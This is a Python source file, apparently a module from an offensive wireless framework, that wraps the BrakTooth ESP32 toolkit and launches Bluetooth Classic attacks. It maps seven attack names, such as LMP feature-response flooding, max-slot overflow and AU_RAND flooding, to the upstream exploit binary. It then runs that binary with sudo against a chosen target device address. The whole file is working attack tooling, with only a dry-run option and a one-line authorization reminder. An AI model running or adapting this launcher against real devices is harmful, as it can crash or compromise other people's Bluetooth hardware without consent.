#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess para BrakTooth — ataques Bluetooth Classic (LMP/Baseband) via ESP32.

Invoca ``bin/bt_exploiter`` do repositório Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks
com firmware ESP32 adequado; não incorpora o código C++/firmware no WirelessXPL.

Version: 1.0.0
"""
from __future__ import annotations

import logging
import os
from pathlib import Path
from subprocess import run
from typing import Dict, List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

# Chaves do bridge -> nome do exploit aceito por bt_exploiter --exploit=
_ATTACK_TO_UPSTREAM: Dict[str, str] = {
    "feature_response_overflow": "feature_response_flooding",
    "duplicated_encapsulated_payload": "wrong_encapsulated_payload",
    "lmp_auto_rate_overflow": "lmp_auto_rate_overflow",
    "truncated_sco_link": "truncated_sco_link_request",
    "invalid_timing_accuracy": "invalid_timing_accuracy",
    "max_slot_length_overflow": "lmp_max_slot_overflow",
    "au_rand_flooding": "au_rand_flooding",
}


class Exploit(Exploit):
    """Subprocess bridge para bt_exploiter (BrakTooth / ESP32)."""

    __info__ = {
        "name": "BrakTooth Bridge",
        "description": (
            "Executa bin/bt_exploiter (subprocess) para PoCs Bluetooth Classic (LMP/Baseband) "
            "via ESP32-WROVER-KIT. Requer build do projeto upstream, firmware gravado na placa e "
            "execução como root (sudo). Mapeia aliases do módulo para nomes de exploit do binário."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Matheus Garbelini / BrakTooth contributors (invoked as subprocess)",
        ),
        "references": (
            "https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks",
            "https://www.braktooth.com/",
        ),
        "devices": ("bluetooth_classic", "br_edr"),
    }

    target_address = OptMAC("", "Endereço BD_ADDR alvo (ex.: aa:bb:cc:dd:ee:ff)")
    attack = OptString(
        "auto",
        "auto | feature_response_overflow | duplicated_encapsulated_payload | "
        "lmp_auto_rate_overflow | truncated_sco_link | invalid_timing_accuracy | "
        "max_slot_length_overflow | au_rand_flooding",
    )
    serial_port = OptString("", "Porta serial do ESP32 (ex.: /dev/ttyUSB0, COM7)")
    dry_run = OptBool(False, "Somente exibir o comando, sem executar")

    def _repo_candidates(self) -> List[Path]:
        """Possíveis raízes do clone BrakTooth."""
        here = Path(__file__).resolve()
        return [
            here.parents[5] / "submodules" / "IoT" / "braktooth_esp32_bluetooth_classic_attacks",
            here.parents[4] / "braktooth_esp32_bluetooth_classic_attacks",
            here.parents[5] / "braktooth_esp32_bluetooth_classic_attacks",
            here.parents[5] / "braktooth",
            here.parents[6] / "IoT" / "braktooth_esp32_bluetooth_classic_attacks",
            here.parents[6] / "IoT" / "braktooth",
        ]

    def _repo_root(self) -> Optional[Path]:
        """Primeira raiz que contém ``bin/bt_exploiter`` ou estrutura mínima do projeto."""
        for c in self._repo_candidates():
            if not c.is_dir():
                continue
            if (c / "bin" / "bt_exploiter").is_file():
                return c.resolve()
            if (c / "README.md").is_file() and (c / "docs").is_dir():
                return c.resolve()
        return None

    def _bt_exploiter_binary(self, repo: Path) -> Path:
        """Caminho esperado do binário."""
        return repo / "bin" / "bt_exploiter"

    def _normalize_attack_key(self, raw: str) -> str:
        """Normaliza a opção ``attack`` para chave interna."""
        return raw.strip().lower().replace("-", "_")

    def _build_command(self, repo: Path, exploit_name: str) -> List[str]:
        """Monta argv para ``sudo bin/bt_exploiter``.

        Args:
            repo: Raiz do repositório.
            exploit_name: Nome do exploit upstream (após mapeamento).

        Returns:
            Lista de argumentos incluindo ``sudo``.

        Raises:
            ValueError: Parâmetros obrigatórios ausentes.
            FileNotFoundError: Binário inexistente.
        """
        port = str(self.serial_port).strip()
        if not port:
            raise ValueError("Defina serial_port do ESP32.")

        addr = str(self.target_address).strip()
        if not addr:
            raise ValueError("Defina target_address (BD_ADDR do alvo).")

        exe = self._bt_exploiter_binary(repo)
        if not exe.is_file():
            raise FileNotFoundError(
                "bin/bt_exploiter não encontrado em {}. Faça o build do BrakTooth no clone.".format(
                    repo,
                )
            )

        return [
            "sudo",
            str(exe),
            "--host-port={}".format(port),
            "--target={}".format(addr),
            "--exploit={}".format(exploit_name),
        ]

    def run(self) -> None:
        """Executa bt_exploiter ou apenas registra o comando (dry_run / auto)."""
        key = self._normalize_attack_key(str(self.attack))

        if key == "auto":
            if self.dry_run:
                logger.info("Ataques mapeados (nome do módulo -> --exploit upstream):")
                for k, upstream in sorted(_ATTACK_TO_UPSTREAM.items()):
                    logger.info("  %s -> %s", k, upstream)
                logger.info("Defina attack=<chave>, serial_port e target_address para executar.")
            else:
                logger.error(
                    "attack=auto não executa exploit. Use dry_run=True para listar modos ou "
                    "defina um attack explícito."
                )
            return

        upstream = _ATTACK_TO_UPSTREAM.get(key)
        if not upstream:
            logger.error(
                "attack desconhecido: %s. Válidos: %s",
                key,
                ", ".join(sorted(_ATTACK_TO_UPSTREAM.keys())),
            )
            return

        repo = self._repo_root()
        if not repo:
            logger.error(
                "Repositório braktooth não encontrado. Clone Matheus-Garbelini/"
                "braktooth_esp32_bluetooth_classic_attacks (ou nome curto braktooth) em "
                "submodules/IoT/ e compile para gerar bin/bt_exploiter."
            )
            return

        try:
            cmd = self._build_command(repo, upstream)
        except (FileNotFoundError, ValueError) as err:
            logger.error("%s", err)
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            logger.info("DRY RUN — BrakTooth: %s", cmd_str)
            logger.info("cwd sugerido: %s", repo)
            return

        logger.info("BrakTooth exploit=%s (upstream=%s)", key, upstream)
        logger.info("Comando: %s", cmd_str)
        logger.info("Uso apenas em equipamento autorizado (pesquisa / lab).")

        env = os.environ.copy()
        try:
            run(cmd, cwd=str(repo), check=False, env=env)
        except KeyboardInterrupt:
            logger.info("BrakTooth interrompido pelo usuário.")
        except Exception as err:
            logger.exception("Falha ao executar bt_exploiter: %s", err)
